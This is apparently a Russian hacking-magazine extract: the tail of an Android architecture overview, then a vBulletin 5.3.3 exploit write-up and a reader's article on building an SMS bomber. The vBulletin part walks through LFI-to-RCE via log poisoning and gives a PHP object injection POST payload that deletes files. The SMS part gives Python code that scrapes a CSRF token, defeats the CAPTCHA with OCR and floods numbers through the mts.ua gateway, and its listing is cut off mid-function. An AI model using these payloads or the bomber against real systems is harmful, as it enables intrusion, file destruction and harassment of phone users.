   почему Apple понадобился язык Swift, на котором она начала перепи‐
   сывать компоненты ОС и стоковые при ложения.
 3. По пулярность. Java — один из самых популярных языков в мире, поэто‐
   му у Android‐разработ чиков изна чально был доступ к огромному количес‐
   тву Java‐библиотек и сниппетов, кода, которые можно задействовать
   в приложении.

Подводя итог: Java и виртуальная машина были правильным выбором. И хотя
сейчас набирает обороты язык  Kotlin, он полностью совместим с Java
на уровне байт‐кода. А это зна чит, что для его поддержки на стороне ОС
не нужно делать ничего. Приложения просто работа ют.


МНОГОЗАДАЧНОСТЬ
Те, кто использует iPhone давно, зна ют, как работали ранние версии iOS.
Фактически  это  была  однозадачная  операционка,  которая  позволяла
работать в фоне или прерывать работу текуще го приложения только предус‐
тановленным приложениям: ты читаешь книжку, тебе звонят — книгочитал ка
сворачивается, и на экране появляется окно звонка. А вот обратная опе рация
невозможна: книгочиталка не только не может прервать работу других при‐
ложений, но и будет убита сра зу пос ле сворачивания.
  Смысл существования такой системы, конечно же, в том, чтобы сэконо‐
мить процессор, оперативную память, а также ресурс батареи. Благодаря ей
(но не только) iPhone мог работать быстро в усло виях ограниченных ресурсов
и очень бережно относился к батарее.
   Android всегда работал ина че. Здесь можно запустить множес тво раз‐
личных приложе ний и все они будут оставать ся в памяти и даже смогут
работать в фоне. Ты открываешь браузер, вводишь адрес и, пока загружается
страница, запускаешь почтовый клиент и читаешь письма. Все как на дес кто‐
пе, с тем исключением, что тебе не нуж но заботить ся о закрытии приложений,
система сделает это сама, когда оперативная память подойдет к концу или ее
не хватит для размещения запус каемого при ложения (само собой, в первую
очередь в расход пой дут редко используемые приложения). Этот механизм
называется lowmemorykiller.





   Имея права root, нас трой ки lowmemorykiller мож но регулировать нап‐
            рямую или с помощью специальных приложений

Важным  элементом  системы многоза дачности  были  службы  (service).
Это особые компоненты приложений, которые могли работать в фоне абсо‐
лютно в любых усло виях: включен экран или выключен, свернуто приложение
или развернуто, службам плевать даже на то, запущено ли родительское при‐
ложение вообще. Оно просто говорило: «Эй, Android, мне нужны ресурсы
процессора, я хочу сделать некоторые расчеты» — и получало эти ресурсы.
В терминологии Android такой запрос к системе называется wakelock (а если
точнее — процессорный wakelock).
  Однако поддержка такого мощного и полезного инстру мента сыграла
с Google злую шутку. Появилось огромное количество приложений, которые
плодили службы на каждый чих, постоянно выполняли какую‐то работу и не
давали смартфону спать. Уста новив на смартфон сотню при ложений, поль‐
зователь получал несколько десятков служб, каждая из которых периодичес ки
что‐то делала (обновить лен ту твиттера, пока телефон спит, — это же так важ‐
но).
  Дела  обстояли  настолько  плачевно,  что  китайские  производители,
не обремененные задачей сохранить совместимость с оригинальным Android
(это требуется, если хочешь устанавливать на свои смартфоны Play Store),
просто отключили в своих смартфонах механиз мы поддержания жизненного
цикла служб для несистемных приложений.
  Продвинутые юзеры шли другим путем: они получа ли права root и устанав‐
ливали приложение Greenify, которое поз воляло заморозить службы выб‐
ранных приложений так, чтобы их уже никто не смог разбудить. Сущес твовали
и более радикальные варианты, например снес ти весь софт, которым поль‐
зуешься реже одного раза в сутки.
  Сама Google также предпринимала определенные действия для борьбы
с «ядовитыми» службами. Большой шаг в этом нап равлении был сде лан в An‐
droid 4.4, где появился интеллектуальный механизм, который определял,
не работает ли служба слишком много времени и не сильно ли она грузит
процессор, и, если это оказывалось так, при бивал ее на месте и не давал
запуститься. Даже на поверхностный взгляд эта версия системы жила
на батарейке заметно дольше предыдущих.
  В Android 6.0 Google пошла еще дальше и оснастила ее механизмом Doze,
который после определенного времени неактивности смартфона (около
одного часа) переводил его в специальный энергосбе регающий режим.
Одна из особенностей это го режима — запрет на wakelock, то есть ни при‐
ложения, ни службы прос то не могут раз будить смартфон, чтобы выполнить
какую‐либо работу. На глаз Android 6.0 не стал жить дольше, так что неизвес‐
тно, сработал ли этот механизм вообще.





                    Шка ла работы Doze

И наконец, в Android 8.0 Google пошла на радикальный шаг — запретила
работу фоновых служб. Но с дву мя исключениями:
 1. Приложение в некото рых случаях, нап ример когда оно находится на экра‐
   не, может запускать службы, но Android прибьет их пос ле ухода приложе‐
   ния в сон.
 2. Видимые пользователю службы до сих пор разрешены. Это так называ‐
  емый foreground service, служба, которая видна в панели уведомлений
   и имеет иконку в статусбаре.

Казалось бы, да, службы — это зло, но как теперь быть таким приложениям,
как противо угон ное, которое должно работать незаметно в фоне? Или тот же
почтовый клиент? Из‐за необходимос ти периодически проверять почту он
должен висеть в панели уведомлений?
  На самом деле нет. Google шла к запрету служб еще с версии 5.0, где
появился  так называемый  JobScheduler. Это специальная подсистема,
которая позволяет приложениям поп росить Android выполнить ту или иную
работу в такое‐то время или при воз никновении такого‐то события (подклю‐
чение к интерне ту, например). И да, JobScheduler сильно напоминает ана‐
логичную функцию из iOS.


BINDER
Вопреки расхожему мнению, Android с самых первых версий использовал
песочницы для изоляции приложений. И реализованы они были весьма инте‐
ресным образом. Каждое приложение запус калось от имени отдельного
пользователя Linux и, таким образом, имело доступ только к своему каталогу
внутри /data/data.
   Друг с другом и с операционной системой приложения могли общаться
только через IPC‐механизм Binder, который требовал авторизации на выпол‐
нение того или иного действия. Этот же механизм использовался и для нес‐
колько других целей: с его помощью система оповещала приложения о сис‐
темных событиях, таких как входящий вызов, пришедшее СМС, вты кание
зарядки и так далее. Приложения получали сообщения и могли на них отре‐
агировать.





    Работу Binder обеспечивают драйвер в ядре Linux и Service Manager

Эта особенность дала Android очень широкие возможности автоматизации,
о которых мы знаем благодаря таким при ложениям, как Tasker, Automate
или Locale. Все эти приложения дос тупны и для Android 8, разве что некото‐
рые опасные возможнос ти, такие как включение/выключение режима полета,
теперь запрещены для использования обычными приложениями.
  Система оповещения  базируется  на  интентах  (intent),  специальном
механизме, реализованном поверх Binder и предназначенном для обмена
информацией между приложениями (или ОС и приложе ниями), а также запус‐
ка компонентов приложений. С помощью интентов можно оповещать при‐
ложения о событиях, попросить систему открыть приложение для обработки
определенных типов данных (например, чтобы открыть опре деленную стра‐
ницу в браузере, достаточно пос лать широковещательный интент со ссылкой
на страницу, и на него откликнутся все приложения, способные отоб ражать
веб‐страницы, либо только дефолтовый бра узер) или просто запустить ком‐
понент того или иного приложения. Например, приложения в Android запус‐
каются не напрямую, а с помощью интентов.
  К сожале нию, как и службы, интенты стали проб лемой для Google и поль‐
зователей Android. Дело в том, что широковеща тельные интенты, исполь‐
зуемые для уведомления приложений о событи ях, приходят сразу ко всем
приложениям, которые заявили, что способ ны на них реагировать. А чтобы
приложение смогло среагировать на интент, его надо запус тить. Картина
получается такая: на смартфоне есть двадцать приложе ний, которые могут
реагировать на интент android.net.conn.CONNECTIVITY_CHANGE, и при каж‐
дом подклю чении к сети и отключении от нее система запускает эти приложе‐
ния, чтобы они смогли среагировать на интент. Как это сказывается на энер‐
гопотреблении — представь сам.
   Google исправила это недора зумение опять же в Android 8.0. Теперь при‐
ложения могут регистрировать обра ботчики широковещательных интентов
только во время своей работы (за небольшими исклю чениями).


СЕРВИСЫ GOOGLE
Google любит бравировать тем, что Android — опе раци онная система
с открытым исходным кодом. Это, конечно же, не совсем так. С одной сто‐
роны, код Android действительно открыт, и именно поэтому мы имеем доступ
к такому количеству раз нообразных кастомных про шивок. С дру гой стороны,
собрав Android из официальных исходни ков, ты получишь систему без нес‐
кольких важных компонентов: 1) отдельных драй веров, исходники которых
производитель прячет, как коммерческую тайну, 2) сервисов Google, которые
нужны в первую оче редь для получения дос тупа к аккаунту, запуска Google
Play и облачного бэкапа.
  Сервисы Google (Google Mobile Services) также отвечают за многие другие
вещи, включая поддержку push‐уведомлений, Instant Apps, Google Maps, дос‐
туп к календарю, определение местоположения по сотовым вышкам и Wi‐Fi‐
роутерам, механизм Smart Lock, позволяющий разблокировать устройство
в зависимости от некото рых усло вий.
  В современных версиях Android сервисы Google взяли на себя нас только
большую часть работы, что жить без них ока зывается хоть и возможно,
но очень проблематич но. А с ними тоже невесело: минимальный вариант
пакета GApps (который содержит только сервисы Google и Google Play) весит
больше 120 Мбайт, а сами сервисы славятся сво ей любовью к оперативке
и заряду батареи. А еще они закрыты, то есть о том, что они могут делать,
знает только сама Google.





  Скачать пакет с сервисами и приложениями Google для кастомной про‐
  шивки можно с сайта opengapps.org (слово open не означает, что они
  открыты)

Именно поэтому на свет появился проект microG, задача которого — вос‐
создать самую важную функциональность сервисов Google в открытом коде.
Уже сейчас microG позволяет получить дос туп к своему аккаунту, активиро‐
вать push‐уведомления, дос туп к картам Google и определению мес тополо‐
жения по сотовым вышкам. И все это при раз мере в четыре мега и почти пол‐
ном отсутствии требований к оперативке и ресурсу батареи.
   У проекта  есть собственная сборка прошивки  LineageOS,  которая
из коробки вклю чает в себя microG и все необходимые для его работы
модификации.


ЯДРО LINUX И РАНТАЙМ
Android основан на ядре Linux. Ядро управляет ресурсами смартфона, в том
числе доступом к железу, управлением оперативной и постоянной памятью,
запуском, остановкой и переносом процес сов между ядрами процессора
и многими другими задача ми. Как и в любой дру гой ОС, ядро — это сердце
Android, центральная часть, без которой все осталь ное раз валится.





                     Слоеный пирог Android

Наличие ядра Linux, а также частично совместимой со стандартом POSIX сре‐
ды исполнения  (в первую очередь это библиоте ка  bionic, основанная
на реализации стандар тной библиотеки язы ка С из OpenBSD) делает Android
совместимым с приложениями для Linux. Например, система аутентификации
wpa_supplicant, применяемая для подключения к Wi‐Fi‐сетям, здесь точно
такая же, как в любом дистрибутиве Linux. В ранних версиях Android исполь‐
зовал ся стандартный bluetooth‐стек Linux под наз ванием bluez (позже его
заменили реализацией от Qualcomm под наз ванием Bluedroid). Здесь даже
есть своя консоль с набором стандартных UNIX/Linux‐команд, реализованных
в наборе Toybox, изначально созданном для встраиваемых Linux‐систем.
   Большинство консоль ных приложений, написанных для Linux, можно пор‐
тировать в Android простой перекомпиляцией с помощью кросс‐компилятора
(главное — использовать ста тичес кую компиляцию, чтобы не получить кон‐
фликт библиотек), а имея права root, на Android‐девайсе можно без всяких
проблем запустить полноценный Linux‐дистрибутив. Один нюанс — доступ
к нему можно будет получить либо только через консоль, либо используя
VNC‐соединение. Также существует проект Maru OS, позволяющий исполь‐
зовать смар тфон в качес тве ПК на базе Debian при подключении к монитору.
Ту же функцию обещает Samsung при подклю чении своих смартфонов
к монитору с помощью дока DeX.





               Старый доб рый mc, запущенный в Android

Начиная с версии 4.4 Android умеет использовать сис тему принудительного
контроля доступа SELinux для защиты от взло ма и получения прав root. SELin‐
ux разработана Агентством национальной безопас ности США и, если не вда‐
ваться в детали, позволяет огра ничить приложения (в том числе сис темные
низкоуровневые компоненты) в воз можнос тях. И речь вовсе не о полномочи‐
ях, которые юзер предоставляет приложениям, а о таких вещах, как сис‐
темные вызовы и доступ к тем или иным файлам, невзирая на стандартные
права доступа UNIX.
  Серия уязвимостей Stagefright, поразивших Android несколько лет назад,
позволяла получить контроль над устрой ством, просто заставив юзера
открыть пришедшую MMS или специальный файл в браузере. Проблема сос‐
тояла в мультимедиафреймворке Stagefright, содержащем сразу несколько
уязвимостей перепол нения буфера. При открытии специальным образом
подготовленного  мультимедиафайла  экспло ит  использовал  уязвимость
и  запускал на  устройстве код  от имени  Stagefright  (который работал
под рутом).
  Все  эти  баги  Google  бла гополучно  закрыла,  а  также  поработала
над модуляризацией кода фреймворка и его запуском в спе циальных
доменах  SELinux. Эти домены запрещают компонентам, ответс твенным
за обработку мультимедиа, использовать большую часть сис темных вызовов
Linux, включая системные вызовы груп пы execve, которые как раз и были при‐
частны к запуску зловредного кода.
  Сегодня SELinux исполь зуется для защиты почти всех системных ком‐
понентов Android. И это стало причиной резкого снижения количес тва най‐
денных багов в Android. Но привело к фокуси ровке взломщиков на ядре,
а точнее тех самых закрытых драйверах, аудит кода которых никто не про‐
водил и безопасность которых не гарантирована (а она, как оказалось,
находится в плачевном сос тоянии).


ВЫВОДЫ
Android определенно не самая стандартная ОС. Мно гие свои черты она поза‐
имствовала из опе рационной системы Inferno, к соз данию которой приложи‐
ли руку разработчики языка С, UNIX и Plan 9. А эти ребята явно знали, что
делали.
ВЗЛОМ

         СЕРЕБРЯНЫЕ
   ПУЛИ





                       ВСКРЫВАЕМ
                      УЯЗВИМОСТЬ
                      В VBULLETIN 5





                                                                                       aLLy
                                                                                   ONsec
                                                                                                @iamsecurity





Ты наверняка неод нократно видел форумы на движке vBul‐
letin. Форумы как таковые уже не на пике моды, но vBulletin
по‐прежнему один из самых популярных движ ков. В его пос‐
ледней  (пятой)  версии наш ли  несколько  уязвимостей,
которые способны сильно испортить жизнь админу. В этой
статье я расскажу, как они эксплуатируются.


Первая проблема заключается в некорректной фильтрации пользовательских
данных. О ней сооб щил независимый исследова тель безопасности, который
пожелал остаться анонимным. Уязвимость, хоть и имеет некоторые ограниче‐
ния, получила статус критической, потому что позволяет читать любые файлы
и выполнять произвольный код на целевой системе.
   Вторая уязвимость была найдена исследова телями из компании TRUEL IT
и получила идентифика тор CVE‐2017‐17672. Она связана с особенностями
десериализации данных в движке и может быть использована атакующим
для удаления произвольных файлов в системе.
  Полные отчеты с деталями обеих проблем были опубликованы в рамках
программы Beyond  Security от SecuriTeam. Там же есть PoC‐экс плоиты
для демонстрации уязвимос тей. Давай по порядку пройдемся по всему это‐
му.


ПРИГОТОВЛЕНИЯ
Поделиться рабочим стендом в виде контей нера Docker я, к сожалению,
не могу: из‐за особен ностей одной из уяз вимос тей успешная эксплу атация
зависит от системы, а ОС, на которой она возможна, — это Windows. К тому
же vBulletin — штука платная, и тебе придет ся самостоятельно найти воз‐
можность достать дистрибутив, если хочешь сам пощупать уязвимости. Скажу
только, что нужная нам версия — это 5.3.3.
  В качестве сервера я использовал дистри бутив WAMP.





                    Ин сталляция vBulletin 5


ЧИТАЕМ ФАЙЛЫ, ВЫПОЛНЯЕМ КОМАНДЫ
Итак, причина первой уяз вимос ти — некорректная логика при обработке
параметра routestring, которая позволяет атакующему добавить через include
любой файл на диске и выполнить PHP‐код, который в нем находится.
  Наш путь начинается с самого главного файла — index.php, где происхо‐
дит базовая инициализация приложения.


/index.php
48: $app = vB5_Frontend_Application::init('config.php');
...
60: $routing = $app‐>getRouter();
61: $method = $routing‐>getAction();
62: $template = $routing‐>getTemplate();
63: $class = $routing‐>getControllerClass();

Посмотрим на метод vB5_Frontend_Application::init.


/includes/vb5/frontend/application.php
13: class vB5_Frontend_Application extends vB5_ApplicationAbstract
14: {
15:     public static function init($configFile)
16:     {
17:         parent::init($configFile);
18:
19:         self::$instance = new vB5_Frontend_Application();
20:         self::$instance‐>router = new vB5_Frontend_Routing();
21:         self::$instance‐>router‐>setRoutes();

Здесь нас интересует метод setRoutes.


/includes/vb5/frontend/routing.php
47:     public function setRoutes()
48:     {
49:         $this‐>processQueryString();
...
54:         if (isset($_GET['routestring']))
55:         {
56:             $path = $_GET['routestring'];

В  переменную  $path  попадает  значение  юзердаты  из  параметра
routestring. В него мож но передать путь до страницы форума, и она будет
загружена.





                 Переда ча параметра routestring

Допустим, мы передали /test.
  После назначения переменной следует кусок кода, который избавляется
от слеша в начале строки, если он присутству ет.


/includes/vb5/frontend/routing.php
75:         if (strlen($path) AND $path{0} == '/')
76:         {
77:             $path = substr($path, 1); // $path = "test"
78:         }

Далее проверяется размер переданных данных, и если он больше двух, то
начинается получение расширения. Вдруг ты решил передать что‐то зап‐
рещенное!


includes\vb5\frontend\routing.php
83:         if (strlen($path) > 2 )
84:         {
85:             $ext = strtolower(substr($path, ‐4)) ;
86:             if (($ext == '.gif') OR ($ext == '.png') OR ($ext ==
'.jpg') OR ($ext == '.css')
87:                 OR (strtolower(substr($path, ‐3)) == '.js') )
88:             {
89:                 header("HTTP/1.0 404 Not Found");
90:                 die('');
91:             }
92:         }

Как видишь, проверка довольно странная. Как минимум смущает наличие
зашитого прямо в код списка запрещенных расширений. Да и вообще сам
факт, что расширение получают, вырезая четыре символа с конца строки
(строка 85), вызывает недо умение. В общем, если мы пытаемся получить
файл с расширениями  gif, png,  jsp, css или  js, то сервер вернет стра‐
ницу 404 и выполнение скрипта прекратится. Когда все проверки пройдены,
с помощью callApi вызывается метод getRoute из клас са vB_Api_Route. Он
ищет подходящие роуты, исхо дя из переданной пользователем информации.


/includes/vb5/frontend/routing.php
92:         try
93:         {
94:             $message = ''; // Start with no error.
95:             $route = Api_InterfaceAbstract::instance()‐>callApi('
route', 'getRoute', array('pathInfo' => $path, 'queryString' => $
_SERVER['QUERY_STRING']));

Естественно, переданного нами роута не найдется, и метод вернет false.


/core/vb/api/route.php
085:    public function getRoute($pathInfo, $queryString, $anchor =
'')
086:    {
...
110:        // Check for standard routes
111:        if (is_string($pathInfo))
...
175:        // Get best route
176:        try
177:        {
...
190:            if ($route)
191:            {
...
338:            }
339:            else
340:            {
341:                return false;
342:            }


/includes/vb5/frontend/routing.php
127:        if (!empty($route))
128:        {
...
188:        }
189:        else
190:        {

Теперь код выполняет филь тра цию пользователь ских данных и пытается рас‐
парсить переданный роут как пару контроллер — метод.


/includes/vb5/frontend/routing.php
192:            $stripped_path = preg_replace('/[^a‐z0‐9\/‐_.]+/i',
'', trim(strval($path), '/'));
193:            if (strpos($stripped_path, '/'))
194:            {
195:                list($controller, $method) = explode('/', strtol
ower($stripped_path), 2);
...
216:            if (class_exists($controllerClass) AND method_exists(
$controllerClass, $controllerMethod))

Эта попытка тоже идет лесом, и мы подходим к одной из важнейших частей
уязвимого кода.


/includes/vb5/frontend/routing.php
234:        if (strpos($path, '/') === false)
235:        {
236:            $this‐>controller = 'relay';
237:            $this‐>action = 'legacy';
238:            $this‐>template = '';
239:            $this‐>arguments = array($path);
240:            $this‐>queryParameters = array();
241:            return;
242:        }

Здесь выполняется проверка на наличие слешей в переданном имени. Если
они не найдены, то с помощью метода legacy кон трол лера vB5_Frontend_‐
Controller_Relay скрипт пытается заг рузить тот роут, что мы передали.


/includes/vb5/frontend/controller/relay.php
63:     public function legacy($file)
64:     {
65:         $api = Api_InterfaceAbstract::instance();
66:         $api‐>relay($file);
67:     }

В свою оче редь, legacy создает экземпляр $api класса Api_Interface_‐
Collapsed и проксирует запрос файла в его метод relay. Пос мотрим на него
поближе.


/includes/api/interface/collapsed.php
117:    public function relay($file)
118:    {
119:        $filePath = vB5_Config::instance()‐>core_path . '/' . $
file;
120:
121:        if ($file AND file_exists($filePath))
122:        {
...
127:            require_once($filePath);

А вот это уже очень интерес но. Переменная $filePath содержит путь
до файла, который состоит из пути до папки, где установлено ядро движка,
и переданные нами в атрибут routestring данные. Если файлы сущес твуют,
то строчка под номером 127 выполнит функцию require_once и включит
в код получившийся файл, попутно выполнив его.





             Переменная $ﬁlePath зависит от юзердаты

Сразу приходит в голову использовать уязвимость типа path traversal, то есть
выйти из директории и прочитать файл за предела ми пре дусмотренной раз‐
работчиками директории. К сожалению, слеши использовать мы не можем
из‐за вот этого усло вия.


/includes/vb5/frontend/routing.php
234:        if (strpos($path, '/') === false)
235:        {

Однако в Windows в качес тве разделителя можно использовать и обратный
слеш.





  Использование обратно го слеша в Windows для перехода по директори ‐
  ям

Теперь попробуем отправить в качестве routestring что‐то типа ..\.





                     Path traversal с помощью routestring

То, что нужно. Теперь надо заинклудить какой‐нибудь интересный файл
с кодом на PHP. Можно было бы поп робовать это сделать через картинку ава‐
тара, но по умолчанию все картинки хра нят ся в виде блобов в базе данных.
  Поэтому воспользуемся трюком с лог‐файлами веб‐сервера. В фай ле ac‐
cess.log Apache, как ты знаешь, по дефолту сохраня ет все запросы к серверу.
Помимо URI, хранятся также переданные параметры.
  Получается такой вектор атаки: сна чала делаем запрос к серверу, содер‐
жащий код на PHP, затем через уязвимос ти подключаем файл access.log,
и код из него выпол няется.





        Эксплуатация RCE в vBulletin через лог‐файл веб‐сервера

Вот так легко и непринужденно мы получили возможность выполнять про‐
извольный код в системе.


ВНЕДРЕНИЕ PHP-ОБЪЕКТОВ
Вторая уязвимость связана с небезопасной десериализаци ей пользователь‐
ских данных. Давай посмотрим на метод cacheTemplates из клас са vB_Li‐
brary_Template. Он использует ся для того, чтобы получать информацию
из базы данных о переданном шаб лоне и сохранять эту информацию в кеше.


/core/vb/library/template.php
164:    public function cacheTemplates($templates, $templateidlist, $
skip_bbcode_style = false, $force_set = false)
165:    {
...
168:        if (!is_array($templateidlist))
169:        {
170:            $templateidlist = unserialize($templateidlist);
171:        }
...
186:            // cache templates
187:            foreach ($temps as $temp)
188:            {
189:                if (empty(self::$templatecache["$temp[title]"])
OR $force_set)
190:                {
191:                    self::$templatecache["$temp[title]"] = $this
‐>getTemplateReturn($temp);
192:                }
193:            }

В строке 170 переменная $templateidlist попада ет в функцию unserial‐
ize. Посмотрим, откуда эта переменная берет ся. Для этого найдем вызовы
метода cacheTemplates.


/core/vb/api/template.php
019: class vB_Api_Template extends vB_Api
020: {
...
135:    public function cacheTemplates($templates, $templateidlist, $
skip_bbcode_style = false, $force_set = false)
136:    {
137:        return vB_Library::instance('template')‐>cacheTemplates($
templates, $templateidlist, $skip_bbcode_style,  $force_set);
138:    }

Как мы видим, cacheTemplates вызывается через vBulletin API, который дос‐
тупен любому пользователю без авторизации и СМС. Вот таким POST‐зап‐
росом можно обратиться к нему.





  Данные из параметра templateidlist без какой‐либо фильтрации попада‐
  ют в функцию unserialize

Теперь управление параметром templateidlist дает возможность выпол‐
нить атаку PHP object  injection, нуж но только най ти подходящий гаджет
или цепочку гаджетов.
  В представленном PoC, который показали ребята из TRUEL IT, они исполь‐
зуют деструктор из класса vB_Image_ImageMagick.


/core/vb/image/imagemagick.php
21: class vB_Image_ImageMagick extends vB_Image
22: {


/core/vb/image.php
0021: abstract class vB_Image
0022: {
...
0137:   protected $imagefilelocation = null;
...
1464:   public function __destruct()
1465:   {
1466:       $this‐>unloadImage();
1467:   }
1468:
1469:   public function unloadImage()
1470:   {
1471:       if (!empty($this‐>imagefilelocation))
1472:       {
1473:           @unlink($this‐>imagefilelocation);
1474:       }
1475:
1476:       $this‐>imagefilelocation = null;
1477:   }

В качестве свойства $imagefilelocation используется путь до файла,
который требует ся удалить. В результате получа ется вот такой запрос на уда‐
ление файла в системе.


POST /ajax/api/template/cacheTemplates HTTP/1.1
Host: vbulletin.visualhack
Content‐Type: application/x‐www‐form‐urlencoded
templates[]=1&templateidlist=O:20:"vB_Image_ImageMagick":1:{s:20:
"%00*%00imagefilelocation";s:13:"/path/to/file";}

Только тут небольшая проблемка — при выполнении этого кода мы отхватим
ошибку:


Fatal error: Cannot use object of type vB_Image_ImageMagick as array

Все потому, что дальше к десериализованному объекту происходит обра‐
щение как к массиву.


/core/vb/library/template.php
173:        foreach ($templates AS $template)
174:        {

Но это совсем не проб лема, нам прос то нужно сделать этот объект элемен‐
том массива. Такой вот скриптик выдаст нужный пейлоад.


<?php
class vB_Image_ImageMagick {
    protected imagefilelocation = "<file_path>";
}
$a = new vB_Image_ImageMagick;
echo serialize([$a]);

Теперь, если передать полученную стро ку в параметре templateidlist, экс‐
плоит отработает успешно.





              Экспло ит успешно отработал. Файл удален

Естественно, эта уязвимость уже не зависит от используемой на сервере
операционной системы и отлично работает как в Linux, так и в Windows.


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ВЫВОДЫ
Окончание года порадовало нас серьезной уязвимостью в популярнейшем
движке. Я вообще думал, что уже больше не уви жу уяз вимостей типа LFI, счи‐
тал, что их эра прошла, а тут такое. :‐)
   Хотя баги до смешного банальны, обна ружи ли их только к версии 5.3.3.
Непонятно, как они усколь зали из виду на про тяжении стольких релизов. Тем
не менее разработчики выпус тили новую версию, где залатали дыру, так что,
если ты счастливый владелец vBulletin, спеши обновиться на 5.3.4.
ВЗЛОМ
SMS-БОМБЕР
  PYTHONНА
ЭКСПЛУАТИРУЕМ
НЕДОРАБОТКИ VODA‐
FONE (БЫВШИЙ
«МТС УКРАИНА»)


ТРЮК
ОТ ЧИТАТЕЛЯ





           sl0n
   bigafroelephant@mail.ru





В этой статье мы исследуем ошибки реали зации CAPTCHA
и CSRF‐токенов, в результате чего научимся рассылать SMS
в любом количестве через гейт Vodafone.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный материалами данной статьи.



ОБЗОР ОНЛАЙН SMS-СЕРВИСА VODAFONE
Наш сегодняшний подопытный, портал http://mts.ua, раньше принадлежал
«МТС Украина». Эту контору выкупил Vodafone. Есть на этом сайте и форма
отправки SMS.
  Защищена она цифровой CAPTCHA из четырех символов. Стоит отметить,
что форма позволяет отправлять SMS только клиентам Vodafone с префик‐
сами номеров:


+38050
+38066
+38095
+38099

Теперь посмотрим на саму CAPTCHA. Как видишь, цифры вполне различимы.
Они имеют красный цвет, но их верх обрезан, и рас положе ны они очень близ‐
ко друг к другу.
  А теперь приглядимся более внимательно к той части скрипта, которая
отображает CAPTCHA. Если мы сформиру ем ссылку


http://www.mts.ua/?r=site/captcha&v=5981aff096f17&widgetId=messager&
width=115&height=42&backColor=0xffffff&foreColor=0xff0000

то увидим CAPTCHA с высотой 42 пикселя и 115 пикселей шириной. Изменив
значения на 242 и 315, мы получим удивительный результат: обре занный верх
цифр уйдет и расстояние меж ду символами увеличится.
  При отправке SMS скрипту http://www.mts.ua/ru/online‐services/
send‐sms/ через метод POST переда ются следующие параметры:
 • YII_CSRF_TOKEN — это CSRF‐токен, который нужно прочитать из HTML
   один раз при подготов ке рас сылки;
 • widgetId:'messager' — это стандартное зна чение, оно не меняется;
 • MessageForm[network]:'38050' — из значения ясно, что это мобиль‐
   ная сеть;
 • MessageForm[phone]:'1234567' — номер телефона, куда отправ‐
   ляем SMS;
 • MessageForm[encoding]:'cyrilic' — кодировка сообщения, можно
   менять;
 • MessageForm[is_translit]:'0' — транслитерация (0 — выключена,
   1 — включена);
 • MessageForm[message]:'Привет 123' — сам текст сообщения;
 • MessageForm[verifyCode]:'4444' — рас познанная CAPTCHA.

Также не стоит забывать, что нужно хра нить cookies! В дальнейшем мы к это‐
му вернемся.


РАЗРАБОТКА SMS-БОМБЕРА
Попробуем разработать SMS‐бомбер — скрипт, который будет рас сылать
через гейт множество однотипных SMS‐сообщений. Разрабатывать будем
на Python 2.x, также нам понадо бят ся модули requests, pytesseract, Im-
age.
   Скрипт мы будем раз рабатывать под Windows, с чем и свя заны особен‐
ности установки Tesseract и настройки путей.


        WWW

                    •FAQ по Tesseract для Python
                    •FAQ по requests для Python


В самом начале мы получаем CSRF‐токен:


def get_csrf():
    xhtml=get_url("http://www.mts.ua/ru/online‐services/send‐sms/",1)
    xs=xhtml.find("var csrfToken = '")
    xl=len("var csrfToken = '")
    csrf_=xhtml[xs+xl:xs+xl+40]
    return csrf_

Функция очевидная — обычный поиск текста. CSRF‐токен получаем всего
один раз за всю рассылку.
   Теперь нужно получить CAPTCHA и распознать ее. Для этого мы будем
использовать Tesseract. Вначале нужно установить саму программу и модуль
Python к ней. Пол ный исходный код функции можно пос мотреть в скрипте,
который я приведу в кон це статьи.
  В этой функции мы скачиваем CAPTCHA и сохраняем ее на диске
как xcaptcha.png. Затем мы распознаем ее с помощью pytesseract и про‐
водим проверку длины распознанной строки. Если в ответе мы получили
четыре сим вола, значит, все правиль но, если нет — пытаемся рас познать
повторно до тех пор, пока не получим искомые четыре цифры.


Вероятность распознавания капчи — 40–60%. Конечно, не 100%, но все рав‐
но солидно.


Для сохранения cookies и получения данных по URL используется вспомога‐
тельная функция get_url: куки сохраняются (или нет) в зависимос ти от зна‐
чения xparam.
  Остается только отпра вить само сооб щение. Это выполняется в функции
send_sms, где запол няют ся все описанные выше параметры для скрипта
http://www.mts.ua/ru/online‐services/send‐sms/ и отправляется POST‐
запрос.
  В зависимости от наличия в ответе стро ки


<div class="response‐message">

мы определяем, успешно отправлено сообщение или нет. Стоит отметить,
что User Agent мы подставляем поддельный:


headers = {'User‐Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X
10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95
Safari/537.36'}





                  Использование SMS‐бомбера


ЗАКЛЮЧЕНИЕ
На этом у меня все. Полный код скрипта при веден во врезке ниже, а я
в качестве заключения еще раз напоминаю: все то, что ты сегодня прочел,
опубликовано исклю чительно в образова тельных целях. ;)


Пол ный лис тинг скрип та



 import sys,os,requests,time,subprocess,string
 try:
     import Image
 except ImportError:
     from PIL import Image
 import pytesseract
 pytesseract.pytesseract.tesseract_cmd = 'C:\\Program Files (x86)\\
 Tesseract‐OCR\\tesseract.exe'
 tessdata_dir_config = '‐‐tessdata‐dir "C:\\Program Files (x86)\\
 Tesseract‐OCR\\tessdata"'
 # ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
 headers = {'User‐Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X
 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95
 Safari/537.36'}
 SESSION=""
 COOKIES=""
 # ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
 def write_to_file(fname,xdata):
     f=open(fname,"w")
     f.close
     f=open(fname,"wb")
     f.write(xdata)
     f.close
 # ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐
 def get_url(xURL,xparam):
     global headers
